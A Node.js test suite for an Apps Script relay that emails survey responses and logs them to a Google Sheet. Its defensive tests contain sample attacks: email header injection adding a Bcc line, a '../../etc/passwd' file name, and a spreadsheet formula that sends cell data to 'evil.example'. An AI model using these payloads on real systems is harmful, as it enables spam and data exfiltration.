#!/usr/bin/env node
/*
 * relay_test.js: tests relay/Code.gs without Google.
 *
 * Code.gs is loaded into a sandbox that imitates the few Apps Script services it uses
 * (MailApp, Utilities, CacheService, LockService, ContentService, Session). The imitation
 * follows the real behaviour that matters here: base64Decode returns SIGNED bytes, a cache
 * value must be a string, and MailApp.sendEmail counts recipients against a daily quota.
 *
 * Usage: node relay/test/relay_test.js        (exit status 0 only if every check passed)
 */
'use strict';
const fs = require('fs');
const path = require('path');
const { world: makeWorld } = require('./sandbox');

let passed = 0, failed = 0;

function check(cond, message) {
  if (cond) { passed += 1; } else { failed += 1; console.log('  FAIL: ' + message); }
}

/* a fresh imitation of Google for each test, wired to this file's check() */
function world(options) {
  const w = makeWorld(options);
  w.check = check;
  return w;
}

const TOKEN = 'db81919a8f6168304dfcedc0';
let counter = 0;
function newId() { counter += 1; return 'dhar-20261019-154500-t' + String(counter).padStart(5, '0'); }
function tinyPdf() { return Buffer.from('%PDF-1.4\n' + 'x'.repeat(300) + '\n%%EOF\n').toString('base64'); }
function request(extra) {
  return Object.assign({
    v: 1, token: TOKEN, id: newId(), subject: 'Shaping Dhar survey response: Student',
    text: 'SHAPING DHAR SURVEY RESPONSE\nSurvey version: 1.0\n\n== END OF RESPONSE ==',
    replyTo: 'ada@example.com',
    pdf: { name: 'shaping-dhar-response-20261019-1545.pdf', data: tinyPdf() }
  }, extra || {});
}

const tests = [];
function test(name, fn) { tests.push([name, fn]); }

/* ---- the happy path ------------------------------------------------------------------------ */
test('a good response is emailed with the PDF attached and Reply-To set', () => {
  const w = world();
  const req = request();
  const r = w.post(req);
  check(r.ok === true && r.delivered === 'emailed' && r.attached === true && r.id === req.id, 'ok reply: ' + JSON.stringify(r));
  check(w.outbox.length === 1, 'exactly one email');
  const m = w.outbox[0];
  check(m.to === 'owner@example.com', 'goes to the script owner by default');
  check(m.replyTo === 'ada@example.com', 'Reply-To is the respondent');
  check(m.name === 'Shaping Dhar survey', 'fixed sender name');
  check(m.subject.indexOf('Shaping Dhar survey response') === 0 && m.subject.indexOf('[' + req.id + ']') > 0, 'subject keeps the prefix and ends with the ID: ' + m.subject);
  check(m.body.indexOf('SHAPING DHAR SURVEY RESPONSE') === 0, 'the report text comes first, unchanged');
  check(m.body.indexOf('== END OF RESPONSE ==') > 0 && /Response ID: dhar-/.test(m.body), 'the trailer follows the end marker');
  check(!('htmlBody' in m), 'plain text only');
  check(m.attachments && m.attachments.length === 1 && m.attachments[0].type === 'application/pdf', 'a PDF is attached');
  check(m.attachments[0].name === req.pdf.name, 'attachment keeps its file name');
  check(Buffer.from(m.attachments[0].bytes.map(b => b & 255)).toString('latin1').indexOf('%PDF-') === 0, 'attachment bytes are the PDF');
});

test('a recipient can be set explicitly', () => {
  const w = world({ owner: '' });
  w.run("CONFIG.RECIPIENT = 'me@example.org'");
  const r = w.post(request());
  check(r.ok && w.outbox[0].to === 'me@example.org', 'uses CONFIG.RECIPIENT');
});

test('without a recipient and without an owner address the request fails cleanly', () => {
  const w = world({ owner: '' });
  const r = w.post(request());
  check(r.ok === false && r.code === 'server', 'server error, not a crash: ' + JSON.stringify(r));
  check(w.outbox.length === 0, 'nothing sent');
  check(!w.cache.has('id:' + 'x'), 'no stale mark');
});

/* ---- who may post -------------------------------------------------------------------------- */
test('wrong or missing token is refused', () => {
  const w = world();
  check(w.post(request({ token: 'nope' })).code === 'forbidden', 'wrong token');
  check(w.post(request({ token: undefined })).code === 'forbidden', 'missing token');
  check(w.post(request({ token: TOKEN + 'x' })).code === 'forbidden', 'longer token');
  check(w.post(request({ token: TOKEN.slice(0, -1) })).code === 'forbidden', 'shorter token');
  check(w.outbox.length === 0, 'nothing sent');
});

test('a blank TOKEN switches the check off', () => {
  const w = world();
  w.run("CONFIG.TOKEN = ''");
  check(w.post(request({ token: undefined })).ok === true, 'accepted without a token');
});

/* ---- malformed requests -------------------------------------------------------------------- */
test('malformed requests are refused without sending anything', () => {
  const w = world();
  check(w.post(null, '').code === 'bad-request', 'empty body');
  check(w.post(null, 'not json').code === 'bad-request', 'not JSON');
  check(w.post(null, '"a string"').code === 'bad-request', 'JSON but not an object');
  check(w.post(request({ v: 2 })).code === 'bad-request', 'unknown protocol');
  check(w.post(request({ id: 'abc' })).code === 'bad-request', 'bad id');
  check(w.post(request({ id: 'dhar-20261019-154500-AB' })).code === 'bad-request', 'bad id (short, capitals)');
  check(w.post(request({ text: 12 })).code === 'bad-request', 'text not a string');
  check(w.post(request({ text: 'hello, buy my pills' })).code === 'bad-request', 'does not look like survey answers');
  check(w.sandbox.doPost({}).content.indexOf('bad-request') > 0, 'no postData at all');
  check(w.outbox.length === 0, 'nothing was sent');
});

test('size limits', () => {
  const w = world();
  const big = 'SHAPING DHAR SURVEY RESPONSE\n' + 'a'.repeat(200001);
  check(w.post(request({ text: big })).code === 'too-large', 'text over the limit');
  check(w.post(null, 'x'.repeat(3500001)).code === 'too-large', 'whole body over the limit');
  check(w.outbox.length === 0, 'nothing sent');
  const ok = 'SHAPING DHAR SURVEY RESPONSE\n' + 'a'.repeat(150000);
  check(w.post(request({ text: ok })).ok === true, 'a long but allowed text passes');
});

/* ---- header injection and sanitising ---------------------------------------------------- */
test('subject and Reply-To cannot inject headers', () => {
  const w = world();
  const r = w.post(request({
    subject: 'Shaping Dhar survey response: x\r\nBcc: victim@example.com\r\n\r\nhi',
    replyTo: 'ada@example.com\r\nBcc: victim@example.com'
  }));
  check(r.ok, 'accepted');
  const m = w.outbox[0];
  check(!/[\r\n]/.test(m.subject), 'subject is one line');
  check(!('bcc' in m) && !('cc' in m), 'no Bcc/Cc field');
  check(m.replyTo === undefined, 'a Reply-To with extra lines is dropped, not repaired');
});

test('Reply-To is only taken from a real address', () => {
  const bad = ['', 'ada', 'ada@', '@example.com', 'ada@example', 'ada example@x.com', 'ada@x.com, bob@y.com', '<ada@x.com>', '+2348012345678', 'ada@x..com', 'a'.repeat(300) + '@x.com'];
  bad.forEach(b => {
    const w = world();
    w.post(request({ replyTo: b }));
    check(w.outbox.length === 1 && w.outbox[0].replyTo === undefined, 'rejected Reply-To: ' + JSON.stringify(b.slice(0, 30)));
  });
  const good = ['ada@example.com', 'ada.obi+survey@sub.example.co.ng', "o'neil@example.ie"];
  good.forEach(g => {
    const w = world();
    w.post(request({ replyTo: g }));
    check(w.outbox[0].replyTo === g, 'accepted Reply-To: ' + g);
  });
});

test('the subject always starts with the prefix; test mode is marked', () => {
  const w = world();
  w.post(request({ subject: 'something else' }));
  w.post(request({ subject: '', test: true }));
  w.post(request({ subject: undefined }));
  check(w.outbox[0].subject.indexOf('Shaping Dhar survey response: something else [dhar-') === 0, 'prefix added: ' + w.outbox[0].subject);
  check(w.outbox[1].subject.indexOf('[TEST] Shaping Dhar survey response [dhar-') === 0, 'test marked: ' + w.outbox[1].subject);
  check(w.outbox[2].subject.indexOf('Shaping Dhar survey response [dhar-') === 0, 'missing subject handled');
  const w2 = world();
  w2.post(request({ subject: 'Shaping Dhar survey response: ' + 'x'.repeat(500) }));
  check(w2.outbox[0].subject.length < 250 && /\[dhar-[^\]]+\]$/.test(w2.outbox[0].subject), 'a long subject is cut but still ends with the ID');
});

test('control characters are stripped from the answers', () => {
  const w = world();
  w.post(request({ text: 'SHAPING DHAR SURVEY RESPONSE\nline\x00 with\x07 control\x1b chars\r\nsecond\n== END OF RESPONSE ==' }));
  const body = w.outbox[0].body;
  check(!/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/.test(body), 'no control characters');
  check(body.indexOf('line with control chars\nsecond') > 0, 'text kept, CRLF normalised');
});

test('non-ASCII text (Yoruba, Igbo, Hausa, naira, CJK) passes through unchanged', () => {
  const w = world();
  const t = 'SHAPING DHAR SURVEY RESPONSE\n[X1] test\n  Ọ̀pẹ́, ṣẹ́ dáà, ìṣẹ́, ƥƥ́, ₦500, 你好\n== END OF RESPONSE ==';
  w.post(request({ text: t }));
  check(w.outbox[0].body.indexOf(t) === 0, 'text identical');
});

/* ---- the PDF ------------------------------------------------------------------------------ */
test('a response without a PDF is still delivered', () => {
  const w = world();
  const r = w.post(request({ pdf: null }));
  check(r.ok && r.attached === false, 'ok, not attached');
  check(!('attachments' in w.outbox[0]), 'no attachment');
  check(/PDF attached: no/.test(w.outbox[0].body), 'trailer says so');
});

test('a bad PDF is dropped, not fatal', () => {
  const cases = {
    'not a PDF': { name: 'a.pdf', data: Buffer.from('<html>' + 'x'.repeat(300)).toString('base64') },
    'bad name': { name: '../../etc/passwd', data: tinyPdf() },
    'bad name 2': { name: 'x.exe', data: tinyPdf() },
    'not base64': { name: 'a.pdf', data: '!!!notbase64!!!' },
    'too small': { name: 'a.pdf', data: Buffer.from('%PDF-1').toString('base64') },
    'wrong types': { name: 5, data: 6 },
    'oversized': { name: 'a.pdf', data: Buffer.from('%PDF-' + 'x'.repeat(2000010)).toString('base64') }
  };
  Object.keys(cases).forEach(k => {
    const w = world();
    const r = w.post(request({ pdf: cases[k] }));
    check(r.ok === true && r.attached === false && !!r.note, k + ': delivered without the PDF, with a note (' + r.note + ')');
    check(w.outbox.length === 1 && !('attachments' in w.outbox[0]), k + ': no attachment');
    check(/PDF attached: no \(/.test(w.outbox[0].body), k + ': trailer explains');
  });
});

test('PDF bytes above 127 survive (signed-byte handling)', () => {
  const w = world();
  const raw = Buffer.concat([Buffer.from('%PDF-1.7\n'), Buffer.from([0xE2, 0xE3, 0xCF, 0xD3, 0xFF, 0x80]), Buffer.alloc(300, 0x41)]);
  const r = w.post(request({ pdf: { name: 'a.pdf', data: raw.toString('base64') } }));
  check(r.ok && r.attached, 'accepted');
  const got = Buffer.from(w.outbox[0].attachments[0].bytes.map(b => b & 255));
  check(got.equals(raw), 'every byte intact');
});

/* ---- retries, limits, failures ---------------------------------------------------------- */
test('a retried response is emailed once', () => {
  const w = world();
  const req = request();
  const a = w.post(req), b = w.post(req), c = w.post(req);
  check(a.ok && !a.duplicate, 'first accepted');
  check(b.ok && b.duplicate === true && c.ok && c.duplicate === true, 'repeats acknowledged as duplicates');
  check(w.outbox.length === 1, 'one email only');
});

test('a failed send can be retried (email only)', () => {
  const w = world({ sendThrows: true });
  w.run('CONFIG.LOG_TO_SHEET = false');
  const req = request();
  const a = w.post(req);
  check(a.ok === false && a.code === 'server' && a.retry === true, 'server error, retryable');
  check(w.errors.some(e => e.indexOf('Service invoked') > 0), 'the error was logged');
  check(!JSON.stringify(w.errors).includes('SHAPING'), 'answers never logged');
  check(!w.cache.has('id:' + req.id), 'the ID mark was removed');
  w.run("MailApp.sendEmail = function (m) { }");   /* the service recovers */
  const b = w.post(req);
  check(b.ok === true && !b.duplicate, 'the retry is accepted');
});

test('a response being processed is not started twice', () => {
  const w = world();
  const req = request();
  w.cache.set('id:' + req.id, 'pending');
  const r = w.post(req);
  check(r.ok === false && r.code === 'busy' && r.retry === true, 'busy: ' + JSON.stringify(r));
  check(w.outbox.length === 0, 'nothing sent');
});

test('hourly limit', () => {
  const w = world();
  let ok = 0, limited = 0;
  for (let i = 0; i < 45; i++) {
    const r = w.post(request());
    if (r.ok) { ok += 1; } else if (r.code === 'too-many') { limited += 1; }
  }
  check(ok === 40 && limited === 5, 'forty allowed, then refused: ' + ok + '/' + limited);
  check(w.outbox.length === 40, 'forty emails');
});

test('daily mail quota is respected with a reserve (email only)', () => {
  const w = world({ quota: 5 });
  w.run('CONFIG.LOG_TO_SHEET = false');
  const r = w.post(request());
  check(r.ok === true, 'at the reserve it still sends');
  const r2 = w.post(request());
  check(r2.ok === false && r2.code === 'quota' && r2.retry === true, 'below the reserve it stops: ' + JSON.stringify(r2));
  check(w.outbox.length === 1, 'one email');
});

test('a busy lock is reported, not crashed on', () => {
  const w = world();
  w.lockFree = false;
  const r = w.post(request());
  check(r.ok === false && r.code === 'busy', 'busy');
  check(w.outbox.length === 0, 'nothing sent');
});

test('delivered IDs are remembered for six hours', () => {
  const w = world();
  w.post(request());
  check(w.lastTtl === 21600, 'TTL of the last cache write is the 6 h maximum: ' + w.lastTtl);
});


/* ---- the response log (a Google Sheet) ------------------------------------------------------ */

const REPORT = [
  'SHAPING DHAR SURVEY RESPONSE',
  'Survey version: 1.0',
  'Submitted: 2026-10-19 15:45 (UTC+01:00) Africa/Lagos',
  'Roles: Student; Developer or engineer',
  'Questions answered: 9 of 12 shown',
  'Question wording: full',
  'PDF copy: shaping-dhar-response-20261019-1545.pdf',
  'Response ID: dhar-20261019-154500-abc123',
  '',
  '== CONTACT ==',
  '',
  '[C1] Would you like to stay informed as Dhar develops?',
  '  Yes, here is how to reach me',
  '[C2] What email address or other contact should we use?',
  '  ada.obi@example.com or WhatsApp +234 801 234 5678',
  '',
  '== ABOUT YOU ==',
  '',
  '[A1] Which country or region are you currently based in?',
  '  Nigeria',
  '[A3] Which of the following describe your current work?',
  '  - Web development',
  '  - Other: Embedded Linux',
  '[P3] How open would you be to teaching with Dhar?',
  '  4 of 5 (1 = Not open at all, 5 = Very open)',
  '[D5] How useful would each feature be?',
  '  (1 = Not useful, 5 = Essential)',
  '  - Bounds checking: 5 of 5',
  '  - Compile-time memory management: 4 of 5',
  '[X6] What put you off new languages before?',
  '  First line of a long answer.',
  '    An indented second line.',
  '',
  '  A paragraph after a blank line.',
  '[X7] Any other idea?',
  '  =HYPERLINK("https://example.com/?q="&A1, "click")',
  '[X8] A phone number only',
  '  08012345678',
  '== END OF RESPONSE =='
].join('\n');

function sheetsOf(w) {
  const book = [...w.books.values()][0];
  return { book, responses: book.getSheetByName('Responses'), questions: book.getSheetByName('Questions') };
}
function rowMap(sheet, n) {
  const head = sheet.rows[0], row = sheet.rows[n], out = {};
  head.forEach((h, i) => { out[h] = row[i] === undefined ? '' : row[i]; });
  return out;
}

test('a response is logged: one row, fixed columns, one column per question code', () => {
  const w = world();
  const req = request({ id: 'dhar-20261019-154500-abc123', text: REPORT });
  const r = w.post(req);
  check(r.ok && r.delivered === 'emailed' && r.logged === true, 'ok, emailed and logged: ' + JSON.stringify(r));
  check(w.books.size === 1 && w.props.get('LOG_SPREADSHEET_ID') === 'book1', 'one spreadsheet was created and its ID remembered');
  const { book, responses, questions } = sheetsOf(w);
  check(book.title === 'Shaping Dhar responses', 'named "Shaping Dhar responses"');
  check(responses.rows.length === 2 && responses.frozen === 1, 'a header row (frozen) and one response row');
  check(responses.rows[0].slice(0, 10).join() === 'received_utc,response_id,survey_version,submitted,roles,answered,reply_to,pdf_copy,status,response_text', 'fixed columns come first');
  check(responses.rows[0].slice(10).join() === 'C1,C2,A1,A3,P3,D5,X6,X7,X8', 'question columns follow in the order they appear: ' + responses.rows[0].slice(10).join());
  const row = rowMap(responses, 1);
  check(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$/.test(row.received_utc), 'received time is UTC ISO: ' + row.received_utc);
  check(row.response_id === 'dhar-20261019-154500-abc123' && row.survey_version === '1.0', 'response id and survey version');
  check(row.roles === 'Student; Developer or engineer' && row.answered === '9 of 12 shown', 'roles and answered');
  check(row.reply_to === 'ada@example.com' && row.pdf_copy === 'shaping-dhar-response-20261019-1545.pdf' && row.status === 'emailed', 'reply_to, pdf_copy, status');
  check(row.response_text === REPORT, 'the whole response text is kept in its cell');
  check(row.C1 === 'Yes, here is how to reach me' && row.A1 === 'Nigeria', 'single choice and text answers');
  check(row.A3 === 'Web development | Other: Embedded Linux', 'multiple choice joined with " | "');
  check(row.P3 === 4 && typeof row.P3 === 'number', 'a scale answer is stored as a number');
  check(row.D5 === 'Bounds checking: 5 | Compile-time memory management: 4', 'a grid becomes "statement: number" pairs');
  check(row.X6 === 'First line of a long answer.\n  An indented second line.\n\nA paragraph after a blank line.', 'a long answer keeps its lines: ' + JSON.stringify(row.X6));
  check(row.X8 === '08012345678', 'a phone number keeps its leading zero (stored as text)');
  check(row.X7 === "'=HYPERLINK(\"https://example.com/?q=\"&A1, \"click\")", 'a typed formula is neutralised with a leading apostrophe: ' + row.X7);
  check(questions.rows[0].join() === 'code,survey_version,question' && questions.rows.length === 10, 'the Questions sheet has a header and one row per code (' + questions.rows.length + ')');
  const q = questions.rows.find(r => r[0] === 'A1');
  check(q && q[1] === '1.0' && q[2] === 'Which country or region are you currently based in?', 'a question row holds the code, version and wording: ' + JSON.stringify(q));
});

test('later responses reuse the sheet; new questions add columns; nothing is duplicated', () => {
  const w = world();
  w.post(request({ id: 'dhar-20261019-154500-aaaaaa', text: REPORT }));
  const second = 'SHAPING DHAR SURVEY RESPONSE\nSurvey version: 1.0\nRoles: Researcher\nResponse ID: dhar-20261019-160000-bbbbbb\n\n[A1] Which country or region are you currently based in?\n  Ghana\n[R9] A brand new question\n  Yes\n== END OF RESPONSE ==';
  w.post(request({ id: 'dhar-20261019-160000-bbbbbb', text: second }));
  const { responses, questions } = sheetsOf(w);
  check(w.books.size === 1, 'still one spreadsheet');
  check(responses.rows.length === 3, 'two response rows');
  check(responses.rows[0].filter(h => h === 'A1').length === 1 && responses.rows[0].includes('R9'), 'A1 is not repeated, the new code R9 got a column');
  const a = rowMap(responses, 1), b = rowMap(responses, 2);
  check(a.A1 === 'Nigeria' && a.R9 === '', 'the first response has an empty cell for the new question');
  check(b.A1 === 'Ghana' && b.R9 === 'Yes' && b.roles === 'Researcher' && b.C2 === '', 'the second response is in its own row and columns');
  check(questions.rows.filter(r => r[0] === 'A1').length === 1, 'A1 is listed once in Questions');
  check(questions.rows.filter(r => r[0] === 'R9').length === 1, 'R9 was added');
  w.run('1');
  const v2 = second.replace('Survey version: 1.0', 'Survey version: 1.1').replace('bbbbbb', 'cccccc');
  w.post(request({ id: 'dhar-20261019-160000-cccccc', text: v2 }));
  check(questions.rows.filter(r => r[0] === 'A1').length === 2, 'the same code under a new survey version is listed again');
});

test('a retried response is logged once', () => {
  const w = world();
  const req = request({ text: REPORT });
  w.post(req); w.post(req); w.post(req);
  check(sheetsOf(w).responses.rows.length === 2, 'one row');
  check(w.outbox.length === 1, 'one email');
});

test('more than 26 columns: the sheet is extended before it is written', () => {
  const w = world();
  let t = 'SHAPING DHAR SURVEY RESPONSE\nSurvey version: 1.0\n\n';
  for (let i = 1; i <= 100; i++) { t += '[Q' + i + '] Question ' + i + '\n  Answer ' + i + '\n'; }
  t += '== END OF RESPONSE ==';
  const r = w.post(request({ text: t }));
  check(r.ok && r.logged === true, 'logged: ' + JSON.stringify(r));
  const { responses } = sheetsOf(w);
  check(responses.maxCols >= 110 && responses.rows[0].length === 110 && responses.rows[1].length === 110, 'columns were added to fit 10 fixed + 100 question columns (' + responses.maxCols + ')');
  check(rowMap(responses, 1).Q100 === 'Answer 100', 'the last question landed in the right column');
});

test('spreadsheet formulas typed by a respondent are neutralised', () => {
  const w = world();
  const cases = ['=IMPORTDATA("http://evil.example/?"&A1)', '+1+1', '-1+2', '@SUM(A1)', '=1+1', '\tTAB', '\rCR'];
  let t = 'SHAPING DHAR SURVEY RESPONSE\nSurvey version: 1.0\n\n';
  cases.forEach((c, i) => { t += '[Z' + (i + 1) + '] q\n  ' + c.replace('\r', '') + '\n'; });
  t += '== END OF RESPONSE ==';
  w.post(request({ text: t }));
  const row = rowMap(sheetsOf(w).responses, 1);
  ['Z1', 'Z2', 'Z3', 'Z4', 'Z5'].forEach(k => check(typeof row[k] === 'string' && row[k][0] === "'" , k + ' starts with an apostrophe: ' + JSON.stringify(row[k])));
  check(row.Z3 === "'-1+2", '"-1+2" is text, not arithmetic');
  check(!Object.values(row).some(v => typeof v === 'string' && /^[=+\-@]/.test(v)), 'no cell in the row begins with a formula character');
});

test('very long answers are cut to fit a cell, and the email keeps everything', () => {
  const w = world();
  const long = 'x'.repeat(60000);
  const t = 'SHAPING DHAR SURVEY RESPONSE\nSurvey version: 1.0\n\n[X1] q\n  ' + long + '\n== END OF RESPONSE ==';
  const r = w.post(request({ text: t }));
  check(r.ok, 'accepted');
  const row = rowMap(sheetsOf(w).responses, 1);
  check(row.X1.length < 50000 && row.X1.endsWith('[cut: see the email]'), 'cell is cut with a pointer to the email: ' + row.X1.length);
  check(row.response_text.length < 50000, 'the response_text cell fits too');
  check(w.outbox[0].body.indexOf(long) > 0, 'the email has the complete answer');
});

test('email fails, log works: the respondent still gets "sent" and the log has it', () => {
  const w = world({ sendThrows: true });
  const req = request({ text: REPORT });
  const r = w.post(req);
  check(r.ok === true && r.delivered === 'stored' && r.logged === true && r.attached === false, 'ok, stored: ' + JSON.stringify(r));
  check(rowMap(sheetsOf(w).responses, 1).status === 'stored', 'the row says stored');
  check(w.errors.length === 1 && /mail error/.test(w.errors[0]) && !JSON.stringify(w.errors).includes('Nigeria'), 'the mail error was logged, without answers');
  const again = w.post(req);
  check(again.ok && again.duplicate === true && sheetsOf(w).responses.rows.length === 2, 'a retry is a duplicate and adds no row');
});

test('log fails, email works: the respondent still gets "sent"', () => {
  const w = world();
  w.sheetThrows = true;
  const r = w.post(request({ text: REPORT }));
  check(r.ok === true && r.delivered === 'emailed' && r.logged === false && r.attached === true, 'ok, emailed, not logged: ' + JSON.stringify(r));
  check(w.outbox.length === 1, 'the email went');
  check(w.errors.length === 1 && /log error/.test(w.errors[0]) && !JSON.stringify(w.errors).includes('Nigeria'), 'the log error was recorded, without answers');
});

test('email and log both fail: an error the page can act on, and a clean retry', () => {
  const w = world({ sendThrows: true });
  w.sheetThrows = true;
  const req = request({ text: REPORT });
  const r = w.post(req);
  check(r.ok === false && r.code === 'server' && r.retry === true, 'server error, retryable: ' + JSON.stringify(r));
  check(!w.cache.has('id:' + req.id), 'the ID mark was removed');
  w.sendThrows = false;
  w.sheetThrows = false;
  const again = w.post(req);
  check(again.ok === true && !again.duplicate && again.delivered === 'emailed' && sheetsOf(w).responses.rows.length === 2, 'the retry is delivered and logged once');
});

test('when the daily mail quota is nearly used, the response is only logged', () => {
  const w = world({ quota: 4 });
  const r = w.post(request({ text: REPORT }));
  check(r.ok === true && r.delivered === 'stored' && r.logged === true, 'stored without an email: ' + JSON.stringify(r));
  check(w.outbox.length === 0 && w.quota === 4, 'no email was attempted');
});

test('the log can be switched off, and a spreadsheet can be named by ID', () => {
  const off = world();
  off.run('CONFIG.LOG_TO_SHEET = false');
  const r = off.post(request({ text: REPORT }));
  check(r.ok && r.logged === false && off.books.size === 0, 'no spreadsheet when LOG_TO_SHEET is false');
  const w = world();
  const mine = w.sandbox.SpreadsheetApp.create('Mine');
  w.run("CONFIG.LOG_SPREADSHEET_ID = '" + mine.getId() + "'");
  w.post(request({ text: REPORT }));
  check(w.books.size === 1 && mine.getSheetByName('Responses') && mine.getSheetByName('Responses').rows.length === 2, 'the named spreadsheet got the sheets and the row');
  check(!w.props.has('LOG_SPREADSHEET_ID'), 'nothing was remembered when the ID comes from the config');
});

test('test responses are marked in the log', () => {
  const w = world();
  w.post(request({ text: REPORT, test: true }));
  check(rowMap(sheetsOf(w).responses, 1).status === 'test-emailed', 'status is test-emailed');
});

test('selfTest also creates the log and says where it is', () => {
  const w = world();
  const lines = [];
  w.sandbox.console.log = (m) => lines.push(String(m));
  w.run('selfTest()');
  check(w.books.size === 1 && lines.some(l => l.indexOf('docs.google.com/spreadsheets/d/book1') > 0), 'the log location is printed: ' + lines.join(' | '));
  check(rowMap(sheetsOf(w).responses, 1).status === 'test-emailed', 'the self-test row is marked');
});

test('the log reads responses the way the Python parser does', () => {
  const { spawnSync } = require('child_process');
  const parser = path.join(__dirname, '..', '..', 'tools', 'parse_responses.py');
  const tmp = path.join(require('os').tmpdir(), 'dhar_parity_' + process.pid + '.txt');
  const variants = [
    REPORT,
    REPORT.replace('  Yes, here is how to reach me', '  No thanks'),
    'SHAPING DHAR SURVEY RESPONSE\nSurvey version: 1.0\n\n[B1] q\n  3 of 5\n[B2] q (0 to 10)\n  7 of 10 (0 = none, 10 = all)\n[B3] empty one\n[B4] q\n  - one\n  - two: three\n== END OF RESPONSE =='
  ];
  variants.forEach((text, n) => {
    fs.writeFileSync(tmp, text);
    const py = spawnSync('python3', ['-I', '-c', [
      'import importlib.util, json, sys',
      'spec = importlib.util.spec_from_file_location("p", sys.argv[1]); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)',
      'blocks = m.split_blocks(m.clean_lines(open(sys.argv[2], encoding="utf-8").read()))',
      'rec, texts = m.parse_block(blocks[0])',
      'print(json.dumps({"rec": rec, "texts": texts}))'
    ].join('\n'), parser, tmp], { encoding: 'utf8' });
    if (py.status !== 0) { check(false, 'python parser ran: ' + py.stderr); return; }
    const want = JSON.parse(py.stdout);
    const w = world();
    const got = JSON.parse(JSON.stringify(w.run('parseResponse_(' + JSON.stringify(text) + ')')));
    const gotAnswers = {};
    got.answers.forEach(a => { gotAnswers[a.code] = a.value; });
    const wantAnswers = {};
    Object.keys(want.rec).forEach(k => { if (/^[A-Z]+[0-9]+[a-z]?$/.test(k)) { wantAnswers[k] = want.rec[k]; } });
    check(JSON.stringify(gotAnswers) === JSON.stringify(wantAnswers), 'variant ' + n + ': every answer equals the Python parser\'s\n    js: ' + JSON.stringify(gotAnswers) + '\n    py: ' + JSON.stringify(wantAnswers));
    const wantTexts = want.texts, gotTexts = {};
    got.answers.forEach(a => { gotTexts[a.code] = a.question; });
    check(JSON.stringify(gotTexts) === JSON.stringify(wantTexts), 'variant ' + n + ': question wording equals the Python parser\'s');
    check(got.header['survey version'] === (want.rec.survey_version || undefined) && got.header['roles'] === (want.rec.roles || undefined) && got.header['response id'] === (want.rec.response_id || undefined), 'variant ' + n + ': header fields agree');
  });
  fs.unlinkSync(tmp);
});

/* ---- other entry points -------------------------------------------------------------------- */
test('doGet only says the service is alive', () => {
  const w = world();
  const out = w.sandbox.doGet();
  const j = JSON.parse(out.content);
  check(j.ok === true && j.service === 'shaping-dhar-relay' && j.protocol === 1, 'alive: ' + out.content);
  check(Object.keys(j).sort().join() === 'ok,protocol,service,version', 'nothing else is revealed');
});

test('selfTest sends a test email with a valid PDF to the owner', () => {
  const w = world();
  w.run('selfTest()');
  check(w.outbox.length === 1, 'one email');
  const m = w.outbox[0];
  check(m.subject.indexOf('[TEST]') === 0 && m.to === 'owner@example.com', 'a marked test to the owner: ' + m.subject);
  const pdf = Buffer.from(m.attachments[0].bytes.map(b => b & 255));
  const s = pdf.toString('latin1');
  check(s.indexOf('%PDF-1.4') === 0 && /%%EOF\n$/.test(s), 'PDF header and trailer');
  const start = parseInt(/startxref\n(\d+)/.exec(s)[1], 10);
  check(s.slice(start, start + 4) === 'xref', 'startxref points at the xref table');
  const offsets = [...s.matchAll(/(\d{10}) 00000 n /g)].map(x => parseInt(x[1], 10));
  check(offsets.length === 5 && offsets.every((o, i) => s.slice(o, o + ((i + 1) + ' 0 obj').length) === (i + 1) + ' 0 obj'), 'every xref offset points at its object');
});

test('the shared token in Code.gs matches the page config', () => {
  /* the site is in src/assets in the development layout and in assets/ in the published one */
  const root = path.join(__dirname, '..', '..');
  const dir = [path.join(root, 'src', 'assets'), path.join(root, 'assets')].find(d => fs.existsSync(path.join(d, 'config.js')));
  check(!!dir, 'found assets/config.js');
  const cfg = fs.readFileSync(path.join(dir, 'config.js'), 'utf8');
  const m = /relayToken:\s*'([^']*)'/.exec(cfg);
  check(!!m && m[1] === TOKEN, 'relayToken in assets/config.js equals CONFIG.TOKEN');
  const proto = /RELAY_PROTOCOL\s*=\s*(\d+)/.exec(fs.readFileSync(path.join(dir, 'survey.js'), 'utf8'));
  check(!!proto && proto[1] === '1', 'RELAY_PROTOCOL in survey.js equals PROTOCOL');
});

/* ---- run ------------------------------------------------------------------------------------ */
for (const [name, fn] of tests) {
  const before = failed;
  try { fn(); } catch (err) { failed += 1; console.log('  ERROR: ' + (err && err.stack || err)); }
  console.log((failed === before ? 'ok   ' : 'FAIL ') + name);
}
console.log('\n' + passed + ' of ' + (passed + failed) + ' checks passed in ' + tests.length + ' tests');
process.exit(failed ? 1 : 0);
